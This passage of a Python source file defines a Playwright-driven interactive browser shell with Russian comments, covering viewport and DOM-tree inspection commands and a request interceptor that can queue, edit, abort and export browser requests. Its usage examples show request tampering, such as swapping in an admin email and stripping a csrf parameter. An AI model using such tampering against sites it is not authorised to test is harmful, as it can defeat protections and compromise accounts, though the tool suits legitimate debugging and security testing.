                document.documentElement.scrollHeight,
                document.documentElement.offsetHeight
            )
        """)
        
        # 2. Устанавливаем viewport под размер страницы
        await page.set_viewport_size({
            "width": 1920,
            "height": min(page_height, 4000)  # Максимум 4000px чтобы не крашнуть
        })
        
        # 3. Отключаем прокрутку и фиксированные элементы
        await page.evaluate("""
            () => {
                // Отключаем прокрутку
                document.body.style.overflow = 'visible';
                document.documentElement.style.overflow = 'visible';
                
                // Временно отключаем fixed/sticky позиционирование
                document.querySelectorAll('header, footer, nav, .mat-toolbar, [class*="fixed"], [class*="sticky"]').forEach(el => {
                    const style = window.getComputedStyle(el);
                    if (style.position === 'fixed' || style.position === 'sticky') {
                        el.style.position = 'relative';
                        el.style.zIndex = 'auto';
                    }
                });
                
                // Скрываем overlay которые могут мешать
                document.querySelectorAll('.cdk-overlay-backdrop, .modal-backdrop, .cc-window').forEach(el => {
                    el.style.display = 'none';
                });
            }
        """)
        
        print(f"✅ Viewport: 1920x{min(page_height, 4000)}")
        print(f"✅ Прокрутка отключена")
        print(f"✅ Fixed элементы преобразованы")
        print(f"\n💡 Теперь вся страница видна без искажений!")
        print(f"💡 Для скриншота: fullscreenshot")
        print(f"💡 Для сброса: viewreset")

    @Command(
        name='viewreset', 
        aliases=['resetview', 'normalview'], 
        description='Сбросить настройки viewport и стилей',
        usage='viewreset',
        example='viewreset',
        notes='Возвращает нормальный вид страницы'
    )
    async def cmd_viewreset(self, args):
        """Сброс настроек просмотра"""
        if not self._check_browser():
            return
        
        print("🔄 Сброс настроек просмотра...")
        
        # 1. Возвращаем нормальный viewport
        await page.set_viewport_size({"width": 1920, "height": 1080})
        
        # 2. Возвращаем стили
        await page.evaluate("""
            () => {
                document.body.style.overflow = 'auto';
                document.documentElement.style.overflow = 'auto';
                
                // Возвращаем fixed позиционирование
                document.querySelectorAll('header, footer, nav, .mat-toolbar').forEach(el => {
                    el.style.position = '';
                    el.style.zIndex = '';
                });
                
                // Показываем overlay обратно
                document.querySelectorAll('.cdk-overlay-backdrop, .modal-backdrop, .cc-window').forEach(el => {
                    el.style.display = '';
                });
            }
        """)
        
        print("✅ Viewport: 1920x1080")
        print("✅ Стили восстановлены")

    @Command(
        name='outline', 
        aliases=['borders', 'highlight'], 
        description='Подсветить все элементы рамками',
        usage='outline [on|off]',
        example='outline\noutline off',
        notes='Показывает границы всех элементов для анализа'
    )
    async def cmd_outline(self, args):
        """Подсветка элементов рамками"""
        if not self._check_browser():
            return
        
        enable = not (args and args[0].lower() in ['off', 'false', '0'])
        
        if enable:
            print("🎨 Включение подсветки элементов...")
            await page.evaluate("""
                () => {
                    // Добавляем стили для подсветки
                    const style = document.createElement('style');
                    style.id = 'playwright-outline-style';
                    style.textContent = `
                        * {
                            outline: 1px solid rgba(255, 0, 0, 0.3) !important;
                            outline-offset: -1px;
                        }
                        *:hover {
                            outline: 2px solid rgba(0, 255, 0, 0.5) !important;
                            background-color: rgba(0, 255, 0, 0.1) !important;
                        }
                        button, a, input, select, textarea {
                            outline: 2px solid rgba(0, 0, 255, 0.5) !important;
                        }
                    `;
                    document.head.appendChild(style);
                }
            """)
            print("✅ Подсветка включена (красный = все, синий = интерактивные)")
        else:
            print("🎨 Отключение подсветки...")
            await page.evaluate("""
                () => {
                    const style = document.getElementById('playwright-outline-style');
                    if (style) style.remove();
                }
            """)
            print("✅ Подсветка отключена")

    @Command(
        name='fullscreenshot', 
        aliases=['fullss', 'fs'], 
        description='Скриншот всей страницы (даже если не видна)',
        usage='fullscreenshot [файл]',
        example='fullscreenshot\nfullscreenshot page.png',
        notes='Сохраняет всю страницу включая прокрутку'
    )
    async def cmd_fullscreenshot(self, args):
        """Скриншот всей страницы"""
        if not self._check_browser():
            return
        
        filename = args[0] if args else f"fullpage_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        
        print(f"📷 Создание full-page скриншота...")
        print(f"   (это может занять несколько секунд)")
        
        try:
            await page.screenshot(
                path=filename,
                full_page=True,
                timeout=120000
            )
            
            import os
            size = os.path.getsize(filename) / 1024 / 1024
            print(f"✅ Скриншот сохранён: {filename} ({size:.2f} MB)")
            print(f"💡 Откройте файл чтобы увидеть всю страницу")
            
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            print(f"💡 Попробуйте: viewall → screenshot")

    @Command(
        name='outlinetree', 
        aliases=['domtree', 'fulltree', 'ot'], 
        description='Вывести всё DOM-дерево страницы в виде текста',
        usage='outlinetree [--depth N] [--text] [--attrs] [--filter TAG] [--links]',
        example='outlinetree\noutlinetree --depth 5 --text --links',
        notes='Показывает все элементы с полными ссылками и текстом'
    )
    async def cmd_outlinetree(self, args):
        """Вывод полного DOM-дерева с исправлениями"""
        if not self._check_browser():
            return
        
        if not await self._is_browser_alive():
            print("❌ Браузер не отвечает! Перезапустите: browser")
            return
        
        # Парсинг аргументов
        max_depth = 6
        show_text = False
        show_all_attrs = False
        filter_tag = None
        show_full_links = False
        
        i = 0
        while i < len(args):
            if args[i] == '--depth' and i + 1 < len(args):
                try:
                    max_depth = int(args[i + 1])
                    i += 2
                    continue
                except ValueError:
                    pass
            elif args[i] == '--text' or args[i] == '-t':
                show_text = True
                i += 1
                continue
            elif args[i] == '--attrs' or args[i] == '-a':
                show_all_attrs = True
                i += 1
                continue
            elif args[i] == '--filter' and i + 1 < len(args):
                filter_tag = args[i + 1].lower()
                i += 2
                continue
            elif args[i] == '--links' or args[i] == '-l':
                show_full_links = True
                i += 1
                continue
            i += 1
        
        print(f"🌳 Построение DOM-дерева (глубина: {max_depth})...\n")
        print(f"{'='*80}")
        
        try:
            # ОДИН запрос к браузеру — получаем всё дерево
            tree_data = await page.evaluate(f"""
                () => {{
                    const maxDepth = {max_depth};
                    const showText = {str(show_text).lower()};
                    const showAllAttrs = {str(show_all_attrs).lower()};
                    const filterTag = '{filter_tag or ''}'.toLowerCase();
                    const showFullLinks = {str(show_full_links).lower()};
                    
                    const SKIP_TAGS = new Set(['script', 'style', 'meta', 'link', 'noscript']);
                    
                    const IMPORTANT_ATTRS = [
                        'id', 'class', 'name', 'type', 'value', 'href', 'src', 
                        'alt', 'title', 'role', 'aria-label', 'placeholder',
                        'data-testid', 'data-cy', 'for', 'action', 'method'
                    ];
                    
                    const INTERACTIVE = new Set([
                        'a', 'button', 'input', 'select', 'textarea', 'form',
                        'label', 'option', 'summary', 'details', '[role="button"]'
                    ]);
                    
                    function isVisible(el) {{
                        if (!el) return false;
                        const style = window.getComputedStyle(el);
                        return style.display !== 'none' && 
                            style.visibility !== 'hidden' && 
                            style.opacity !== '0';
                    }}
                    
                    // ✅ ИСПРАВЛЕНИЕ: Получаем ВСЕ текстовые узлы рекурсивно
                    function getAllText(el) {{
                        if (!el) return '';
                        const walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT, {{
                            acceptNode: (node) => {{
                                const text = node.textContent.trim();
                                return text ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
                            }}
                        }});
                        
                        const texts = [];
                        let node;
                        while (node = walker.nextNode()) {{
                            texts.push(node.textContent.trim());
                        }}
                        return texts.join(' ').replace(/\s+/g, ' ').trim();
                    }}
                    
                    // ✅ ИСПРАВЛЕНИЕ: Корректная обработка ссылок и путей
                    function formatAttrValue(attr, value) {{
                        if (!value) return null;
                        
                        // Для href — показываем полный URL если возможно
                        if (attr === 'href' && value) {{
                            if (value.startsWith('http')) {{
                                // Абсолютная ссылка — обрезаем разумно
                                return value.length > 60 ? value.slice(0, 57) + '...' : value;
                            }} else if (value.startsWith('/')) {{
                                // Относительный путь от корня
                                return window.location.origin + value;
                            }} else {{
                                // Относительный путь — показываем как есть
                                return value;
                            }}
                        }}
                        
                        // Для src — аналогично
                        if (attr === 'src' && value) {{
                            if (value.startsWith('http')) {{
                                return value.length > 60 ? value.slice(0, 57) + '...' : value;
                            }}
                            return value;
                        }}
                        
                        // Для остальных — просто обрезаем если длинные
                        return value.length > 50 ? value.slice(0, 47) + '...' : value;
                    }}
                    
                    function buildNode(el, depth) {{
                        if (depth > maxDepth) return null;
                        if (!(el instanceof Element)) return null;
                        
                        const tag = el.tagName.toLowerCase();
                        if (SKIP_TAGS.has(tag)) return null;
                        
                        // Фильтр по тегу
                        if (filterTag && tag !== filterTag) {{
                            const children = [];
                            for (const child of el.children) {{
                                const childNode = buildNode(child, depth + 1);
                                if (childNode) children.push(childNode);
                            }}
                            return children.length > 0 ? {{ tag: '...', children, isContainer: true }} : null;
                        }}
                        
                        const node = {{
                            tag: tag,
                            id: el.id || null,
                            class: el.className?.toString?.().split(' ').filter(c=>c).slice(0, 3).join('.') || null,
                            text: showText ? getAllText(el).slice(0, 150) : null,
                            interactive: INTERACTIVE.has(tag) || el.getAttribute('role') === 'button',
                            visible: isVisible(el),
                            attrs: {{}},
                            children: [],
                            isLink: tag === 'a',
                            linkUrl: tag === 'a' ? el.href : null,
                            imgUrl: tag === 'img' ? el.src : null
                        }};
                        
                        // ✅ ИСПРАВЛЕНИЕ: Правильный выбор атрибутов
                        const attrsToShow = showAllAttrs 
                            ? IMPORTANT_ATTRS 
                            : ['id', 'name', 'type', 'role', 'aria-label', 'placeholder'];
                        
                        // Всегда добавляем href для ссылок и src для изображений
                        if (tag === 'a') attrsToShow.push('href');
                        if (tag === 'img') attrsToShow.push('src');
                        if (tag === 'input') attrsToShow.push('type', 'name', 'value');
                        if (tag === 'form') attrsToShow.push('action', 'method');
                        
                        for (const attr of [...new Set(attrsToShow)]) {{
                            const val = el.getAttribute(attr);
                            if (val && val.trim()) {{
                                node.attrs[attr] = formatAttrValue(attr, val);
                            }}
                        }}
                        
                        // Дети
                        for (const child of el.children) {{
                            const childNode = buildNode(child, depth + 1);
                            if (childNode) {{
                                node.children.push(childNode);
                            }}
                        }}
                        
                        return node;
                    }}
                    
                    const root = document.body || document.documentElement;
                    const tree = buildNode(root, 0);
                    
                    return {{
                        url: window.location.href,
                        title: document.title,
                        totalElements: document.querySelectorAll('*').length,
                        tree: tree
                    }};
                }}
            """)
            
            # Вывод информации
            print(f"📌 URL: {tree_data['url'][:70]}")
            print(f"📝 Заголовок: {tree_data['title'][:50]}")
            print(f"📦 Всего элементов: {tree_data['totalElements']}")
            print(f"{'='*80}\n")
            
            # Вывод дерева
            if tree_data['tree']:
                self._print_outline_tree_fixed(tree_data['tree'], prefix="", is_last=True, depth=0, show_full_links=show_full_links)
            else:
                print("❌ Не удалось построить дерево")
            
            print(f"\n{'='*80}")
            print(f"💡 Подсказки:")
            print(f"   --depth N     : глубина дерева (по умолчанию 6)")
            print(f"   --text        : показывать текст элементов")
            print(f"   --attrs       : показывать все атрибуты")
            print(f"   --filter TAG  : фильтровать по тегу (button, input, a)")
            print(f"   --links       : показывать полные URL ссылок")
            print(f"{'='*80}")
            
        except Exception as e:
            error_msg = str(e)
            if 'pipe closed' in error_msg.lower() or 'connection closed' in error_msg.lower():
                print("\n🚨 Браузер упал! Перезапустите: browser")
            else:
                print(f"❌ Ошибка: {error_msg[:150]}")

    @Command(
        name='elementtree', 
        aliases=['etree', 'et'], 
        description='Дерево конкретного элемента по селектору',
        usage='elementtree <селектор> [--depth N]',
        example='elementtree #navbarAccount\nelementtree form --depth 4',
        notes='Показывает структуру выбранного элемента'
    )
    async def cmd_elementtree(self, args):
        """Дерево конкретного элемента"""
        if not self._check_browser():
            return
        
        if not args:
            print("❌ Укажите селектор: elementtree #id")
            return
        
        selector = args[0]
        max_depth = 5
        
        # Парсинг --depth
        for i, arg in enumerate(args):
            if arg == '--depth' and i + 1 < len(args):
                try:
                    max_depth = int(args[i + 1])
                except ValueError:
                    pass
        
        print(f"🌳 Дерево элемента: '{selector}' (глубина: {max_depth})...\n")
        print(f"{'='*80}")
        
        try:
            tree_data = await page.evaluate(f"""
                () => {{
                    const selector = '{selector}';
                    const maxDepth = {max_depth};
                    
                    const root = document.querySelector(selector);
                    if (!root) {{
                        return {{ error: `Элемент '${selector}' не найден` }};
                    }}
                    
                    function buildNode(el, depth) {{
                        if (depth > maxDepth || !(el instanceof Element)) return null;
                        
                        const tag = el.tagName.toLowerCase();
                        
                        return {{
                            tag: tag,
                            id: el.id || null,
                            class: el.className?.toString().split(' ').slice(0, 2).join('.') || null,
                            text: el.textContent?.trim().slice(0, 50) || null,
                            attrs: {{
                                type: el.getAttribute('type'),
                                name: el.getAttribute('name'),
                                href: el.getAttribute('href'),
                                role: el.getAttribute('role'),
                                'aria-label': el.getAttribute('aria-label')
                            }},
                            children: Array.from(el.children).map(c => buildNode(c, depth + 1)).filter(Boolean)
                        }};
                    }}
                    
                    return {{ tree: buildNode(root, 0) }};
                }}
            """)
            
            if tree_data.get('error'):
                print(f"❌ {tree_data['error']}")
                return
            
            if tree_data['tree']:
                self._print_outline_tree_fixed(tree_data['tree'], prefix="", is_last=True, depth=0)
            else:
                print("❌ Пустой элемент")
            
            print(f"\n{'='*80}")
            
        except Exception as e:
            print(f"❌ Ошибка: {str(e)[:100]}")

    @Command(
        name='tagtree', 
        aliases=['tt', 'tags'], 
        description='Дерево только указанных тегов',
        usage='tagtree <тег1,тег2>',
        example='tagtree button,input\ntagtree a,button',
        notes='Показывает только выбранные теги в структуре'
    )
    async def cmd_tagtree(self, args):
        """Дерево конкретных тегов"""
        if not self._check_browser():
            return
        
        if not args:
            print("❌ Укажите теги: tagtree button,input")
            return
        
        tags = [t.strip().lower() for t in args[0].split(',')]
        
        print(f"🏷️  Дерево тегов: {', '.join(tags)}...\n")
        print(f"{'='*80}")
        
        try:
            tree_data = await page.evaluate(f"""
                () => {{
                    const targetTags = new Set({tags});
                    
                    function buildNode(el, depth) {{
                        if (depth > 8 || !(el instanceof Element)) return null;
                        
                        const tag = el.tagName.toLowerCase();
                        const hasTargetChild = Array.from(el.children).some(c => {{
                            const childTag = c.tagName.toLowerCase();
                            return targetTags.has(childTag) || 
                                Array.from(c.children).some(gc => 
                                    targetTags.has(gc.tagName.toLowerCase())
                                );
                        }});
                        
                        if (!targetTags.has(tag) && !hasTargetChild) return null;
                        
                        const node = {{
                            tag: tag,
                            id: el.id || null,
                            class: el.className?.toString().split(' ').slice(0, 2).join('.') || null,
                            text: el.textContent?.trim().slice(0, 40) || null,
                            isTarget: targetTags.has(tag),
                            children: []
                        }};
                        
                        for (const child of el.children) {{
                            const childNode = buildNode(child, depth + 1);
                            if (childNode) node.children.push(childNode);
                        }}
                        
                        return node;
                    }}
                    
                    return {{ tree: buildNode(document.body, 0) }};
                }}
            """)
            
            def print_tag_tree(node, prefix="", is_last=True):
                if not node:
                    return
                
                branch = "└── " if is_last else "├── "
                extension = "    " if is_last else "│   "
                
                tag = node['tag']
                highlight = "🎯" if node.get('isTarget') else "  "
                id_str = f"#{node['id']}" if node.get('id') else ""
                text_str = f' "{node["text"]}"' if node.get('text') and node.get('isTarget') else ""
                
                line = f"{prefix}{branch}{highlight}<{tag}{id_str}>{text_str}"
                print(line)
                
                for i, child in enumerate(node.get('children', [])):
                    print_tag_tree(child, prefix + extension, i == len(node['children']) - 1)
            
            if tree_data['tree']:
                print_tag_tree(tree_data['tree'])
            
            print(f"\n{'='*80}")
            print(f"🎯 = целевой тег")
            
        except Exception as e:
            print(f"❌ Ошибка: {str(e)[:100]}")

    @Command(
        name='inspecton', 
        aliases=['intercepton', 'proxyon'], 
        description='Включить перехват запросов',
        usage='inspecton [--url FILTER] [--method GET|POST]',
        example='inspecton\ninspecton --url /api\ninspecton --method POST',
        notes='Начинает перехватывать запросы для просмотра и редактирования'
    )
    async def cmd_inspecton(self, args):
        """Включить перехват"""
        global inspector
        
        if inspector["enabled"]:
            print("⚠️ Перехват уже включён")
            return
        
        # Парсинг фильтров
        for i, arg in enumerate(args):
            if arg == '--url' and i+1 < len(args):
                inspector["filter_url"] = args[i+1]
            elif arg == '--method' and i+1 < len(args):
                inspector["filter_method"] = args[i+1].upper()
        
        print("🔍 Включение перехвата...")
        
        # Регистрируем обработчик
        await page.route("**/*", self._on_request_intercept)
        
        inspector["enabled"] = True
        inspector["queue"] = []
        inspector["history"] = []
        
        print("✅ Перехват включён")
        if inspector["filter_url"]:
            print(f"   🎯 URL фильтр: {inspector['filter_url']}")
        if inspector["filter_method"]:
            print(f"   🎯 Метод фильтр: {inspector['filter_method']}")
        print("💡 Используйте 'inspectlist' для просмотра запросов")

    @Command(
        name='inspectoff', 
        aliases=['interceptoff', 'proxyoff'], 
        description='Выключить перехват запросов',
        usage='inspectoff',
        example='inspectoff',
        notes='Отключает перехват и отправляет все ожидающие запросы'
    )
    async def cmd_inspectoff(self, args):
        """Выключить перехват"""
        global inspector
        
        if not inspector["enabled"]:
            print("⚠️ Перехват уже выключен")
            return
        
        print("🔕 Выключение перехвата...")
        
        # Отправляем все ожидающие
        for item in inspector["queue"]:
            if item["status"] == "pending":
                try:
                    await item["route"].continue_()
                    item["status"] = "continued"
                except:
                    pass
        
        await page.unroute("**/*")
        inspector["enabled"] = False
        
        print("✅ Перехват выключен")
        print(f"📊 Обработано: {len(inspector['history'])} запросов")

    @Command(
        name='inspectlist', 
        aliases=['inspectls', 'queuelist'], 
        description='Показать перехваченные запросы',
        usage='inspectlist [--pending] [--history]',
        example='inspectlist\ninspectlist --pending\ninspectlist --history',
        notes='Показывает очередь ожидающих или историю запросов'
    )
    def cmd_inspectlist(self, args):
        """Показать очередь запросов"""
        global inspector
        
        show_history = '--history' in args or '-h' in args
        show_pending = '--pending' in args or '-p' in args or not show_history
        
        print(f"\n{'='*80}")
        
        if show_pending:
            pending = [q for q in inspector["queue"] if q["status"]=="pending"]
            print(f"⏳ ОЖИДАЮЩИЕ ({len(pending)}):")
            if pending:
                print(f"{'№':<3} {'ID':<8} {'Method':<6} {'URL':<45} {'Time'}")
                print(f"{'-'*80}")
                for item in pending:
                    url = item["url"][:42] + "..." if len(item["url"])>45 else item["url"]
                    print(f"{item['id']:<8} {item['method']:<6} {url:<45} {item['time']}")
            else:
                print("   (пусто)")
        
        if show_history:
            hist = inspector["history"][-20:]  # Последние 20
            print(f"\n📜 ИСТОРИЯ ({len(hist)}):")
            if hist:
                print(f"{'ID':<8} {'Method':<6} {'Status':<10} {'URL':<40}")
                print(f"{'-'*80}")
                for item in hist:
                    url = item["url"][:37] + "..." if len(item["url"])>40 else item["url"]
                    icon = {"continued":"➡️","aborted":"🚫","edited":"✏️"}.get(item["status"],"•")
                    print(f"{item['id']:<8} {item['method']:<6} {icon}{item['status']:<9} {url}")
            else:
                print("   (пусто)")
        
        print(f"{'='*80}\n💡 inspectskip N | inspectedit N | inspectabort N | inspectskipall")

    @Command(
        name='inspectshow', 
        aliases=['showreq', 'reqdetail'], 
        description='Показать детали перехваченного запроса',
        usage='inspectshow <ID>',
        example='inspectshow req_0\ninspectshow 0',
        notes='Показывает заголовки, тело и параметры запроса'
    )
    async def cmd_inspectshow(self, args):
        """Показать детали запроса"""
        global inspector
        
        if not args:
            print("❌ Укажите ID: inspectshow req_0")
            return
        
        req_id = args[0]
        if req_id.isdigit():
            req_id = f"req_{req_id}"
        
        item = next((q for q in inspector["queue"] if q["id"]==req_id), None)
        if not item:
            print(f"❌ Запрос {req_id} не найден")
            return
        
        print(f"\n{'='*80}")
        print(f"📦 ЗАПРОС [{item['id']}]")
        print(f"{'='*80}")
        print(f"🕐 {item['time']} | 📮 {item['method']} | 📋 {item['body_type'] or 'нет тела'}")
        print(f"🔗 {item['url']}")
        
        # Заголовки
        print(f"\n📑 Заголовки:")
        for k,v in list(item['headers'].items())[:8]:
            print(f"   {k}: {v[:60]}{'...' if len(v)>60 else ''}")
        
        # Тело
        if item['body']:
            print(f"\n📄 Тело ({item['body_type']}):")
            if item['body_type']=='json':
                import json
                print(f"   {json.dumps(item['body'], indent=2, ensure_ascii=False)[:400]}")
            elif item['body_type']=='form':
                for k,v in item['body'].items():
                    print(f"   {k}={v}")
            else:
                print(f"   {str(item['body'])[:400]}")
        
        print(f"\n{'='*80}")
        print(f"💡 inspectskip {item['id']} | inspectedit {item['id']} | inspectabort {item['id']}")

    @Command(
        name='inspectskip', 
        aliases=['skipreq', 'continue'], 
        description='Отправить перехваченный запрос без изменений',
        usage='inspectskip <ID>',
        example='inspectskip req_0\ninspectskip 0\ninspectskipall',
        notes='Отправляет запрос как есть, удаляет из очереди'
    )
    async def cmd_inspectskip(self, args):
        """Пропустить запрос"""
        global inspector
        
        if not args:
            print("❌ Укажите ID: inspectskip req_0")
            return
        
        req_id = args[0]
        if req_id.isdigit():
            req_id = f"req_{req_id}"
        
        item = next((q for q in inspector["queue"] if q["id"]==req_id), None)
        if not item:
            print(f"❌ Запрос {req_id} не найден")
            return
        
        if item["status"] != "pending":
            print(f"⚠️ Запрос уже обработан: {item['status']}")
            return
        
        try:
            await item["route"].continue_()
            item["status"] = "continued"
            inspector["history"].append(item)
            print(f"✅ [{req_id}] Отправлен: {item['method']} {item['url'][:50]}")
        except Exception as e:
            print(f"❌ Ошибка: {e}")

    @Command(
        name='inspectskipall', 
        aliases=['skipall', 'runall'], 
        description='Отправить все ожидающие запросы',
        usage='inspectskipall',
        example='inspectskipall',
        notes='Пропускает всю очередь без редактирования'
    )
    async def cmd_inspectskipall(self, args):
        """Пропустить все"""
        global inspector
        
        pending = [q for q in inspector["queue"] if q["status"]=="pending"]
        if not pending:
            print("📭 Нет ожидающих запросов")
            return
        
        print(f"🚀 Отправка {len(pending)} запросов...")
        for item in pending:
            try:
                await item["route"].continue_()
                item["status"] = "continued"
                inspector["history"].append(item)
            except:
                pass
        
        print(f"✅ Все запросы отправлены")
        inspector["auto"] = True

    @Command(
        name='inspectabort', 
        aliases=['abortreq', 'drop'], 
        description='Отменить перехваченный запрос (не отправлять)',
        usage='inspectabort <ID>',
        example='inspectabort req_0\ninspectabort 0',
        notes='Блокирует отправку запроса на сервер'
    )
    async def cmd_inspectabort(self, args):
        """Отменить запрос"""
        global inspector
        
        if not args:
            print("❌ Укажите ID: inspectabort req_0")
            return
        
        req_id = args[0]
        if req_id.isdigit():
            req_id = f"req_{req_id}"
        
        item = next((q for q in inspector["queue"] if q["id"]==req_id), None)
        if not item:
            print(f"❌ Запрос {req_id} не найден")
            return
        
        if item["status"] != "pending":
            print(f"⚠️ Запрос уже обработан: {item['status']}")
            return
        
        try:
            await item["route"].abort()
            item["status"] = "aborted"
            inspector["history"].append(item)
            print(f"🚫 [{req_id}] Отменён: {item['method']} {item['url'][:50]}")
        except Exception as e:
            print(f"❌ Ошибка: {e}")

    @Command(
        name='inspectedit', 
        aliases=['editreq', 'modify'], 
        description='Редактировать перехваченный запрос',
        usage='inspectedit <ID> [--json "F=V"] [--add "P=V"] [--del P] [--header "N=V"]',
        example='inspectedit req_0 --json email=admin@test.com\ninspectedit 0 --add token=xyz --del csrf',
        notes='Модифицирует JSON, form-data или заголовки перед отправкой'
    )
    async def cmd_inspectedit(self, args):
        """Редактировать запрос"""
        global inspector
        
        if len(args) < 1:
            print("❌ Укажите ID: inspectedit req_0")
            return
        
        req_id = args[0]
        if req_id.isdigit():
            req_id = f"req_{req_id}"
        
        item = next((q for q in inspector["queue"] if q["id"]==req_id), None)
        if not item:
            print(f"❌ Запрос {req_id} не найден")
            return
        
        if item["status"] != "pending":
            print(f"⚠️ Запрос уже обработан: {item['status']}")
            return
        
        # Парсинг опций редактирования
        json_upd = {}
        form_add = {}
        form_del = []
        headers_upd = {}
        
        i = 1
        while i < len(args):
            if args[i] == '--json' and i+1 < len(args):
                k,v = args[i+1].split('=',1) if '=' in args[i+1] else (args[i+1],'')
                json_upd[k] = self._parse_value(v)
                i += 2
            elif args[i] == '--add' and i+1 < len(args):
                k,v = args[i+1].split('=',1) if '=' in args[i+1] else (args[i+1],'')
                form_add[k] = v
                i += 2
            elif args[i] == '--del' and i+1 < len(args):
                form_del.append(args[i+1])
                i += 2
            elif args[i] == '--header' and i+1 < len(args):
                k,v = args[i+1].split('=',1) if '=' in args[i+1] else (args[i+1],'')
                headers_upd[k] = v
                i += 2
            elif args[i] == '--show':
                await self.cmd_inspectshow([req_id])
                return
            else:
                i += 1
        
        # Если нет модификаций — показать детали
        if not any([json_upd, form_add, form_del, headers_upd]):
            await self.cmd_inspectshow([req_id])
            print(f"\n💡 inspectedit {req_id} --json email=value")
            print(f"💡 inspectedit {req_id} --add param=value --del oldparam")
            return
        
        # Применяем изменения
        modified = False
        
        # JSON
        if json_upd and item["body_type"]=="json" and isinstance(item["body"],dict):
            item["body"].update(json_upd)
            modified = True
            print(f"✏️ JSON: {list(json_upd.keys())}")
        
        # Form
        if item["body_type"]=="form" and isinstance(item["body"],dict):
            for k in form_del:
                if k in item["body"]:
                    del item["body"][k]
                    modified = True
            for k,v in form_add.items():
                item["body"][k] = v
                modified = True
            if form_add or form_del:
                print(f"✏️ Form: +{list(form_add.keys())} -{form_del}")
        
        # Headers
        if headers_upd:
            item["headers"].update(headers_upd)
            modified = True
            print(f"✏️ Headers: {list(headers_upd.keys())}")
        
        if not modified:
            print("⚠️ Нет применимых изменений для этого запроса")
            return
        
        # Отправляем модифицированный
        try:
            import json
            from urllib.parse import urlencode
            
            opts = {}
            if headers_upd:
                opts["headers"] = {**item["request"].headers, **headers_upd}
            
            if item["body_type"]=="json" and json_upd:
                opts["post_data"] = json.dumps(item["body"], ensure_ascii=False)
                if "headers" not in opts:
                    opts["headers"] = dict(item["request"].headers)
                opts["headers"]["Content-Type"] = "application/json"
            elif item["body_type"]=="form" and (form_add or form_del):
                opts["post_data"] = urlencode(item["body"], doseq=True)
                if "headers" not in opts:
                    opts["headers"] = dict(item["request"].headers)
                opts["headers"]["Content-Type"] = "application/x-www-form-urlencoded"
            
            await item["route"].continue_(**opts)
            item["status"] = "edited"
            item["modified"] = True
            inspector["history"].append(item)
            print(f"✅ [{req_id}] Отправлен с изменениями")
            
        except Exception as e:
            print(f"❌ Ошибка отправки: {e}")
            try:
                await item["route"].continue_()
                item["status"] = "continued"
            except:
                pass

    @Command(
        name='inspectfilter', 
        aliases=['filterreq', 'setfilter'], 
        description='Установить фильтры для перехвата',
        usage='inspectfilter [--url PATTERN] [--method GET|POST] [--clear]',
        example='inspectfilter --url /api\ninspectfilter --method POST\ninspectfilter --clear',
        notes='Фильтрует какие запросы перехватывать'
    )
    def cmd_inspectfilter(self, args):
        """Установить фильтры"""
        global inspector
        
        if '--clear' in args or '-c' in args:
            inspector["filter_url"] = None
            inspector["filter_method"] = None
            print("✅ Фильтры очищены")
            return
        
        for i, arg in enumerate(args):
            if arg == '--url' and i+1 < len(args):
                inspector["filter_url"] = args[i+1]
                print(f"✅ URL фильтр: {inspector['filter_url']}")
            elif arg == '--method' and i+1 < len(args):
                inspector["filter_method"] = args[i+1].upper()
                print(f"✅ Метод фильтр: {inspector['filter_method']}")
        
        if not any(a in args for a in ['--url','--method','-c']):
            print(f"📋 Текущие фильтры:")
            print(f"   URL: {inspector['filter_url'] or 'все'}")
            print(f"   Метод: {inspector['filter_method'] or 'все'}")

    @Command(
        name='inspectstatus', 
        aliases=['proxystatus', 'inspectinfo'], 
        description='Показать статус инспектора',
        usage='inspectstatus',
        example='inspectstatus',
        notes='Показывает статистику перехвата'
    )
    def cmd_inspectstatus(self, args):
        """Статус инспектора"""
        global inspector
        
        pending = len([q for q in inspector["queue"] if q["status"]=="pending"])
        
        print(f"\n🕵️  INSPECTOR STATUS")
        print(f"{'='*50}")
        print(f"Статус: {'🟢 ВКЛ' if inspector['enabled'] else '🔴 ВЫКЛ'}")
        print(f"Перехвачено: {len(inspector['queue'])}")
        print(f"Ожидают: {pending}")
        print(f"Обработано: {len(inspector['history'])}")
        print(f"Фильтр URL: {inspector['filter_url'] or 'нет'}")
        print(f"Фильтр метод: {inspector['filter_method'] or 'нет'}")
        print(f"Авто-режим: {'✅' if inspector['auto'] else '❌'}")
        print(f"{'='*50}")

    @Command(
        name='inspectclear', 
        aliases=['clearqueue', 'resetinspect'], 
        description='Очистить очередь и историю инспектора',
        usage='inspectclear',
        example='inspectclear',
        notes='Удаляет все перехваченные запросы из памяти'
    )
    def cmd_inspectclear(self, args):
        """Очистить инспектор"""
        global inspector
        
        inspector["queue"] = []
        inspector["history"] = []
        inspector["auto"] = False
        
        print("✅ Очередь и история очищены")

    @Command(
        name='inspectexport', 
        aliases=['exportreq', 'savequeue'], 
        description='Экспортировать перехваченные запросы в файл',
        usage='inspectexport <файл.json>',
        example='inspectexport requests.json',
        notes='Сохраняет запросы в JSON для анализа'
    )
    def cmd_inspectexport(self, args):
        """Экспорт запросов"""
        global inspector
        
        if not args:
            print("❌ Укажите файл: inspectexport data.json")
            return
        
        filename = args[0]
        
        try:
            import json
            
            export_data = {
                "exported_at": datetime.now().isoformat(),
                "queue": [],
                "history": []
            }
            
            # Копируем без route-объектов (не сериализуются)
            for item in inspector["queue"]:
                safe = {k:v for k,v in item.items() if k not in ['route','request']}
                export_data["queue"].append(safe)
            
            for item in inspector["history"]:
                safe = {k:v for k,v in item.items() if k not in ['route','request']}
                export_data["history"].append(safe)
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False, default=str)
            
            print(f"✅ Экспортировано {len(export_data['queue'])+len(export_data['history'])} запросов в {filename}")
            
        except Exception as e:
            print(f"❌ Ошибка экспорта: {e}")

if __name__ == "__main__":
    # Проверка установки Playwright
    try:
        import playwright
    except ImportError:
        print("❌ Playwright не установлен. Установите:")
        print("pip install playwright")
        print("playwright install chromium")
        sys.exit(1)
    
    shell = SimpleShell()
    
    try:
        shell.run()
    except KeyboardInterrupt:
        print("\nЗавершение работы...")
